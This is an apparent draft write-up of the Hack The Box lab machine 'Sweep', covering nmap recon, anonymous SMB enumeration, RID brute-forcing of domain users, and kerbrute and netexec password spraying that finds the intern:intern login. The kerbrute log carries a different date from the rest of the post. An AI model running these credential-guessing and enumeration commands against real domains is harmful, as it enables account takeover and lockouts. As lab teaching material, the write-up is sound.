---
title: Sweep
date: 2026-04-06
ShowToc: true
draft: true
TocOpen: true
tags:
  - blog
  - HTB
  - windows
  - smb-to-rce
  - kerbrute-set-up
  - kerbrute-bash-BruteForce
  - netexec-BurteForce
  - SSH-honeyPot
  - netexec-bloodhound
  - bloodhound-setup
  - bloodhound-GenericAll
  - Windows-Privilege-Escalation-lansweeper
lastmod: 2026-04-07T06:14:47.528Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/sweep" >}}

***

# Recon

### PORT & IP SCAN

The `nmap` reveal that the machine is Windows active directory due to the port 88 kerberos-sec , opened the SMB

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.177  -oN serviceScan.txt

Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 14:55 +0800
Nmap scan report for 10.129.234.177
Host is up (0.070s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
81/tcp    open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Lansweeper - Login
|_Requested resource was /login.aspx
82/tcp    open  ssl/xfer?
| ssl-cert: Subject: commonName=Lansweeper Secure Website
| Subject Alternative Name: DNS:localhost, DNS:localhost, DNS:localhost
| Not valid before: 2021-11-21T09:22:27
|_Not valid after:  2121-12-21T09:22:27
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-04-06 06:56:00Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: sweep.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: sweep.vl, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=inventory.sweep.vl
| Not valid before: 2026-04-05T06:46:59
|_Not valid after:  2026-10-05T06:46:59
|_ssl-date: 2026-04-06T06:57:30+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SWEEP
|   NetBIOS_Domain_Name: SWEEP
|   NetBIOS_Computer_Name: INVENTORY
|   DNS_Domain_Name: sweep.vl
|   DNS_Computer_Name: inventory.sweep.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-06T06:56:49+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
9524/tcp  open  ssl/http          Microsoft Kestrel httpd
|_ssl-date: 2026-04-06T06:57:30+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=lansweeper-server-communication
| Subject Alternative Name: DNS:localhost, DNS:INVENTORY, DNS:inventory.sweep.vl, IP Address:192.168.115.145
| Not valid before: 2024-02-08T19:51:08
|_Not valid after:  3024-02-08T19:51:08
| tls-alpn: 
|   h2
|_  http/1.1
49664/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
53919/tcp open  msrpc             Microsoft Windows RPC
53933/tcp open  msrpc             Microsoft Windows RPC
53960/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
53961/tcp open  msrpc             Microsoft Windows RPC
59548/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: INVENTORY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-06T06:56:50
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.23 seconds
```

### DNS

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  nxc smb 10.129.234.177  --generate-hosts-file  hosts
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
                                                                
```

Add the generate item into the /etc/hosts

{{< code >}}\
127.0.0.1       localhost\
127.0.1.1       kali-linux-2025-2.localdomain   kali-linux-2025-2\
10.129.234.177     INVENTORY.sweep.vl sweep.vl INVENTORY

# The following lines are desirable for IPv6 capable hosts

::1     localhost ip6-localhost ip6-loopback\
ff02::1 ip6-allnodes\
ff02::2 ip6-allrouters\
{{< /code >}}

### Port 81,82

They the same i think

{{< tech-stack >}}

OS: Windows\
Web Server: ASP.NET

{{< /tech-stack >}}

### WebSite Directory BurteForce

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ feroxbuster -u http://10.129.234.177:81           
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.234.177:81/
 🚩  In-Scope Url          │ 10.129.234.177
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        3l        8w      126c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       14l       27w      294c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      155c http://10.129.234.177:81/images => http://10.129.234.177:81/images/
301      GET        2l       10w      154c http://10.129.234.177:81/cache => http://10.129.234.177:81/cache/
301      GET        2l       10w      152c http://10.129.234.177:81/css => http://10.129.234.177:81/css/
301      GET        2l       10w      158c http://10.129.234.177:81/templates => http://10.129.234.177:81/templates/
301      GET        2l       10w      151c http://10.129.234.177:81/js => http://10.129.234.177:81/js/
301      GET        2l       10w      153c http://10.129.234.177:81/user => http://10.129.234.177:81/user/
301      GET        2l       10w      152c http://10.129.234.177:81/img => http://10.129.234.177:81/img/
301      GET        2l       10w      158c http://10.129.234.177:81/Templates => http://10.129.234.177:81/Templates/
301      GET        2l       10w      155c http://10.129.234.177:81/assets => http://10.129.234.177:81/assets/
```

nothing found

***

# svc\_inventory\_lnx

{{< toggle "Tag 🏷️" >}}

{{< tag "smb-to-rce" >}} Finding SMB accepts anonymous users login,enumerating users by bruteforcing the RID(Relative Identifier) on the remote target, using the repeated username and password to login , the same credential can be logged as web 82  lansweeper web system, setting up the SSH honeyPot to Intercept SSH Credential by sshesame, and credential can be used for bloodhound search to find the GenericAll attack outbound which can add myself into the remote group to have the evil-winrm shell.

{{< /toggle >}}

{{< mindmap >}}

# SMB

* anonymous
  * RID bruteforce

# repeated username and password

* web 82  lansweeper
  * SSH honeyPot
    * Intercept SSH Credential

# bloodhound

* GenericAll
  * bloodyAD
    * remote group
      * evil-winrm

{{< /mindmap >}}

### SMB

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc smb 10.129.234.177  -u 'guest' -p '' --shares                               
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\guest: 
SMB         10.129.234.177  445    INVENTORY        [*] Enumerated shares
SMB         10.129.234.177  445    INVENTORY        Share           Permissions     Remark
SMB         10.129.234.177  445    INVENTORY        -----           -----------     ------
SMB         10.129.234.177  445    INVENTORY        ADMIN$                          Remote Admin
SMB         10.129.234.177  445    INVENTORY        C$                              Default share
SMB         10.129.234.177  445    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
SMB         10.129.234.177  445    INVENTORY        IPC$            READ            Remote IPC
SMB         10.129.234.177  445    INVENTORY        Lansweeper$                     Lansweeper Actions
SMB         10.129.234.177  445    INVENTORY        NETLOGON                        Logon server share 
SMB         10.129.234.177  445    INVENTORY        SYSVOL                          Logon server share 
                                                                                                        
```

The `DefaultPackageShare$` can be read , so i will check it by `smbclient.py` -N is mean login by guest

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ smbclient //10.129.234.177/DefaultPackageShare$ -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Feb  9 03:46:04 2024
  ..                                  D        0  Fri Feb  9 03:47:44 2024
  Images                              D        0  Fri Feb  9 03:46:08 2024
  Installers                          D        0  Fri Feb  9 03:46:04 2024
  Scripts                             D        0  Fri Feb  9 03:46:08 2024

                5048575 blocks of size 4096. 1054118 blocks available
NT_STATUS_NO_SUCH_FILE listing \-R
smb: \> cd Images
smb: \Images\> ls
  .                                   D        0  Fri Feb  9 03:46:08 2024
  ..                                  D        0  Fri Feb  9 03:46:04 2024
  WindowsLS.jpg                       A   132382  Tue Jan 30 09:47:08 2024

                5048575 blocks of size 4096. 1054118 blocks available
smb: \Images\> get WindowsLS.jpg
getting file \Images\WindowsLS.jpg of size 132382 as WindowsLS.jpg (421.1 KiloBytes/sec) (average 421.1 KiloBytes/sec)
smb: \Images\> ls
  .                                   D        0  Fri Feb  9 03:46:08 2024
  ..                                  D        0  Fri Feb  9 03:46:04 2024
  WindowsLS.jpg                       A   132382  Tue Jan 30 09:47:08 2024

                5048575 blocks of size 4096. 1054118 blocks available
smb: \Images\> cd ..
smb: \> ls
  .                                   D        0  Fri Feb  9 03:46:04 2024
  ..                                  D        0  Fri Feb  9 03:47:44 2024
  Images                              D        0  Fri Feb  9 03:46:08 2024
  Installers                          D        0  Fri Feb  9 03:46:04 2024
  Scripts                             D        0  Fri Feb  9 03:46:08 2024

                5048575 blocks of size 4096. 1054118 blocks available
smb: \> cd Installers
smb: \Installers\> ls
  .                                   D        0  Fri Feb  9 03:46:04 2024
  ..                                  D        0  Fri Feb  9 03:46:04 2024

                5048575 blocks of size 4096. 1054118 blocks available
smb: \Installers\> cd ..
smb: \> ls
  .                                   D        0  Fri Feb  9 03:46:04 2024
  ..                                  D        0  Fri Feb  9 03:47:44 2024
  Images                              D        0  Fri Feb  9 03:46:08 2024
  Installers                          D        0  Fri Feb  9 03:46:04 2024
  Scripts                             D        0  Fri Feb  9 03:46:08 2024

                5048575 blocks of size 4096. 1054118 blocks available
smb: \> cd Scripts
smb: \Scripts\> ls
  .                                   D        0  Fri Feb  9 03:46:08 2024
  ..                                  D        0  Fri Feb  9 03:46:04 2024
  CmpDesc.vbs                         A     1119  Tue Jan 30 09:47:08 2024
  CopyFile.vbs                        A      728  Tue Jan 30 09:47:08 2024
  Wallpaper.vbs                       A     1245  Tue Jan 30 09:47:08 2024

                5048575 blocks of size 4096. 1054118 blocks available
smb: \Scripts\> get CmpDesc.vbs
getting file \Scripts\CmpDesc.vbs of size 1119 as CmpDesc.vbs (3.7 KiloBytes/sec) (average 215.5 KiloBytes/sec)
smb: \Scripts\> get CopyFile.vbs
getting file \Scripts\CopyFile.vbs of size 728 as CopyFile.vbs (1.1 KiloBytes/sec) (average 104.9 KiloBytes/sec)
getting file \Scripts\Wallpaper.vbs of size 1245 as Wallpaper.vbs (3.1 KiloBytes/sec) (average 80.6 KiloBytes/sec)
smb: \Scripts\> 

```

Only has the CopyFile.vbs CmpDesc.vbs Wallpaper.vbs WindowsLS.jpg

`WindowsLS.jpg`\
![Pasted image 20260406153115.png](/ob/Pasted%20image%2020260406153115.png)

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ strings WindowsLS.jpg                         
ZExif
Adobe Photoshop CS5.1 Windows
2015:05:27 15:12:59
Adobe_CM
Adobe
b34r
7GWgw
AQaq"
dEU6te
'7GWgw
I%)$
IJI$
I8i-.
h0Oi
I)I$
I%)$
V]h;os}:^u
IJI$
I%)$
Ic4{
12$juu
I%)$
s@;]
z>wU
os}{
n;Cwn
q..q;
(RI$
I%)$
IJI$
I)I$
I%)$
IJI$
I%)$
IJI$
Photoshop 3.0
8BIM
8BIM
printOutput
ClrSenum
ClrS
RGBC
Inteenum
Inte
Clrm
```

Only know that the `jpg` is made by Photoshop in windows, other file is nothing

### (RID) Rid-brute

Failed to get any helpful info from here

Get the username from enumeration or (RID) Rid-brute\
I dont get anything from smb share , so try the rid from the smb

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc smb 10.129.234.177  -u 'guest' -p '' --rid-brute 
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\guest: 
SMB         10.129.234.177  445    INVENTORY        498: SWEEP\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        500: SWEEP\Administrator (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        501: SWEEP\Guest (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        502: SWEEP\krbtgt (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        512: SWEEP\Domain Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        513: SWEEP\Domain Users (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        514: SWEEP\Domain Guests (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        515: SWEEP\Domain Computers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        516: SWEEP\Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        517: SWEEP\Cert Publishers (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        518: SWEEP\Schema Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        519: SWEEP\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        520: SWEEP\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        521: SWEEP\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        522: SWEEP\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        525: SWEEP\Protected Users (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        526: SWEEP\Key Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        527: SWEEP\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        553: SWEEP\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        571: SWEEP\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        572: SWEEP\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        1000: SWEEP\INVENTORY$ (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1101: SWEEP\DnsAdmins (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        1102: SWEEP\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        1103: SWEEP\Lansweeper Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        1113: SWEEP\jgre808 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1114: SWEEP\bcla614 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1115: SWEEP\hmar648 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1116: SWEEP\jgar931 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1117: SWEEP\fcla801 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1118: SWEEP\jwil197 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1119: SWEEP\grob171 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1120: SWEEP\fdav736 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1121: SWEEP\jsmi791 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1122: SWEEP\hjoh690 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1123: SWEEP\svc_inventory_win (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1124: SWEEP\svc_inventory_lnx (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1125: SWEEP\intern (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        3101: SWEEP\Lansweeper Discovery (SidTypeGroup)                                                                                                    
```

Extra the helpful username by `bash` ,i will vim to put everything into the tmp.txt first , and finally output the username.txt

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat tmp.txt |  awk -F '\' '{print $2}' | awk -F "(" '{print $1}'  | sed 's/ //g' > username.txt  && cat username.txt
guest:
EnterpriseRead-onlyDomainControllers
Administrator
Guest
krbtgt
DomainAdmins
DomainUsers
DomainGuests
DomainComputers
DomainControllers
CertPublishers
SchemaAdmins
EnterpriseAdmins
GroupPolicyCreatorOwners
Read-onlyDomainControllers
CloneableDomainControllers
ProtectedUsers
KeyAdmins
EnterpriseKeyAdmins
RASandIASServers
AllowedRODCPasswordReplicationGroup
DeniedRODCPasswordReplicationGroup
INVENTORY$
DnsAdmins
DnsUpdateProxy
LansweeperAdmins
jgre808
bcla614
hmar648
jgar931
fcla801
jwil197
grob171
fdav736
jsmi791
hjoh690
svc_inventory_win
svc_inventory_lnx
intern
LansweeperDiscovery
```

{{< toggle "Tag 🏷️" >}}

{{< tag "kerbrute-set-up" >}} Setting up the kerbrute with any platform like arm , x86-64 kali linux\
{{< /toggle >}}

Installing the kerbrute with  go

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo apt install golang
[sudo] password for parallels: 
The following packages were automatically installed and are no longer required:
  amass-common              libfuse2t64            libmjpegutils-2.1-0t64  librubberband2     libwiretap15                          python3-protobuf
  curlftpfs                 libgav1-1              libmongoc-1.0-0t64      libsframe1         libwsutil16                           python3-pysmi
  firmware-ti-connectivity  libgdal36              libmpeg2encpp-2.1-0t64  libsigsegv2        mesa-vdpau-drivers                    python3-terminaltables
. . . snip . . .
                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ git  clone https://github.com/ropnop/kerbrute.git                                                                           
Cloning into 'kerbrute'...
remote: Enumerating objects: 845, done.
remote: Counting objects: 100% (98/98), done.
remote: Compressing objects: 100% (24/24), done.
remote: Total 845 (delta 80), reused 74 (delta 74), pack-reused 747 (from 1)
Receiving objects: 100% (845/845), 412.51 KiB | 3.08 MiB/s, done.
Resolving deltas: 100% (382/382), done.
                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cd kerbrute              
                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/kerbrute]
└─$ go build -o kerbrute
go: downloading github.com/op/go-logging v0.0.0-20160315200505-970db520ece7

```

Install successfully

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cd kerbrute 
                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/kerbrute]
└─$ ls -l kerbrute && chmod +x kerbrute
-rwxrwxr-x 1 parallels parallels 8774229 Apr  6 15:51 kerbrute
                                                                                                                                                            
                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/kerbrute]
└─$ ./kerbrute                                                                                   

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/06/26 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string          The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int          Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string      The full domain to use (e.g. contoso.com)
      --downgrade          Force downgraded encryption type (arcfour-hmac-md5)
      --hash-file string   File to save AS-REP hashes to (if any captured), otherwise just logged
  -h, --help               help for kerbrute
  -o, --output string      File to write logs to. Optional.
      --safe               Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int        Threads to use (default 10)
  -v, --verbose            Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
                                                                           
```

I will the the Same account name and same password ,also try the Cipher Transformation if need

It’s important to make sure my clock matches the target with `kerbrute`, or this attempt will silently fail even though it’s a different error. I can see this with `-v`:

{{< toggle "Tag 🏷️" >}}

{{< tag "kerbrute-bash-BruteForce" >}} Writing the bash script to let the kerbrute having the using wordlist function to do same username and password bruteForce attack.

{{< /toggle >}}

First to avoid time error so syncing time of domain and local kali.

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/kerbrute]
└─$ sudo apt install ntpsec-ntpdate
ntpsec-ntpdate is already the newest version (1.2.4+dfsg-1).
The following packages were automatically installed and are no longer required:
  amass-common              libfuse2t64            libmjpegutils-2.1-0t64  librubberband2     libwiretap15                          python3-protobuf
  curlftpfs                 libgav1-1              libmongoc-1.0-0t64      libsframe1         libwsutil16                           python3-pysmi
  firmware-ti-connectivity  libgdal36              libmpeg2encpp-2.1-0t64  libsigsegv2        mesa-vdpau-drivers                    python3-terminaltables
  gir1.2-girepository-2.0   libgdata-common        libmplex2-2.1-0t64      libsnmp40t64       pocketsphinx-en-us                    python3-xlrd
  libarmadillo14            libgdata22             libmupdf25.1            libsoup-2.4-1      python3-bluepy                        python3-xlutils
  libaudio2                 libgdk-pixbuf2.0-bin   libnet1                 libsoup2.4-common  python3-click-plugins                 python3-xlwt
  libavfilter10             libgeos3.13.1          libobjc-14-dev          libsphinxbase3t64  python3-fs                            python3-yaswfp
  libavformat61             libgirepository-1.0-1  libogdi4.1              libsqlcipher1      python3-gpg                           python3-zombie-imp
  libbluray2                libgpgme11t64          libplacebo349           libswscale8        python3-kismetcapturebtgeiger         ruby-unf-ext
  libbson-1.0-0t64          libgpgmepp6t64         libpocketsphinx3        libtheora0         python3-kismetcapturefreaklabszigbee  samba-ad-dc
  libconfig-inifiles-perl   libhdf4-0-alt          libportmidi0            libtsk19t64        python3-kismetcapturertl433           samba-ad-provision
  libcrypt-dev              libinstpatch-1.0-2     libpostproc58           libudfread0        python3-kismetcapturertladsb          samba-dsdb-modules
  libdisplay-info2          libjs-jquery-ui        libqt5ct-common1.8      libvdpau-va-gl1    python3-kismetcapturertlamr           vdpau-driver-all
  libdlt2                   libjs-underscore       libradare2-5.0.0t64     libwireshark18     python3-multipart
Use 'sudo apt autoremove' to remove them.

Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 17
                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/kerbrute]
└─$ sudo ntpdate INVENTORY.sweep.vl 
2026-04-06 16:05:53.395390 (+0800) -0.131443 +/- 0.018518 INVENTORY.sweep.vl 10.129.234.177 s1 no-leap
```

With the bash script to the same username and password kerbrute brute-force attack

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/kerbrute]
└─$ kerbrute bruteforce <(cat username.txt | while read user; do echo "$user:$user"; done) -d sweep.vl --dc inventory.sweep.vl -v

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/08/25 - Ronnie Flathers @ropnop

2025/08/08 17:00:03 >  Using KDC(s):
2025/08/08 17:00:03 >   inventory.sweep.vl:88

2025/08/08 17:00:03 >  [!] krbtgt@sweep.vl:krbtgt - USER LOCKED OUT
2025/08/08 17:00:03 >  [!] bcla614@sweep.vl:bcla614 - Invalid password
2025/08/08 17:00:03 >  [!] fcla801@sweep.vl:fcla801 - Invalid password
2025/08/08 17:00:03 >  [!] Guest@sweep.vl:Guest - Invalid password
2025/08/08 17:00:03 >  [!] jgre808@sweep.vl:jgre808 - Invalid password
2025/08/08 17:00:03 >  [!] jgar931@sweep.vl:jgar931 - Invalid password
2025/08/08 17:00:03 >  [!] Administrator@sweep.vl:Administrator - Invalid password
2025/08/08 17:00:03 >  [!] INVENTORY$@sweep.vl:INVENTORY$ - Invalid password
2025/08/08 17:00:03 >  [!] jwil197@sweep.vl:jwil197 - Invalid password
2025/08/08 17:00:03 >  [!] hmar648@sweep.vl:hmar648 - Invalid password
2025/08/08 17:00:03 >  [!] grob171@sweep.vl:grob171 - Invalid password
2025/08/08 17:00:04 >  [!] fdav736@sweep.vl:fdav736 - Invalid password
2025/08/08 17:00:04 >  [!] jsmi791@sweep.vl:jsmi791 - Invalid password
2025/08/08 17:00:04 >  [!] intern@sweep.vl:intern - [Root cause: KDC_Error] KDC_Error: AS Exchange Error: kerberos error response from KDC: KRB Error: (37) KRB_AP_ERR_SKEW Clock skew too great
2025/08/08 17:00:04 >  [!] svc_inventory_lnx@sweep.vl:svc_inventory_lnx - Invalid password
2025/08/08 17:00:04 >  [!] hjoh690@sweep.vl:hjoh690 - Invalid password
2025/08/08 17:00:04 >  [!] svc_inventory_win@sweep.vl:svc_inventory_win - Invalid password
2025/08/08 17:00:04 >  Done! Tested 17 logins (0 successes) in 0.467 seconds
```

{{< toggle "Tag 🏷️" >}}

{{< tag "netexec-BurteForce" >}} Doing the bruteforce with netexec 's --continue-on-success

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ netexec smb inventory.sweep.vl -u username.txt  -p username.txt --continue-on-success  | grep '[+]'
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\: 
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\guest:: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\EnterpriseRead-onlyDomainControllers: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\Guest: 
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\DomainAdmins: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\DomainUsers: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\DomainGuests: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\DomainComputers: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\DomainControllers: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\CertPublishers: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\SchemaAdmins: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\EnterpriseAdmins: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\GroupPolicyCreatorOwners: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\Read-onlyDomainControllers: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\CloneableDomainControllers: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\ProtectedUsers: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\KeyAdmins: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\EnterpriseKeyAdmins: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\RASandIASServers: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\AllowedRODCPasswordReplicationGroup: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\DeniedRODCPasswordReplicationGroup: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\DnsAdmins: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\DnsUpdateProxy: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\LansweeperAdmins: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\LansweeperDiscovery: (Guest)
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\: 
SMB                      10.129.234.177  445    INVENTORY        [+] sweep.vl\intern:intern 
                                                                                                
```

if the item has the (Guest) that can be missed as we login as Guest before ,  only intern:intern dont have the (Guest)

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ netexec smb inventory.sweep.vl -u intern -p intern --shares                                        
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\intern:intern 
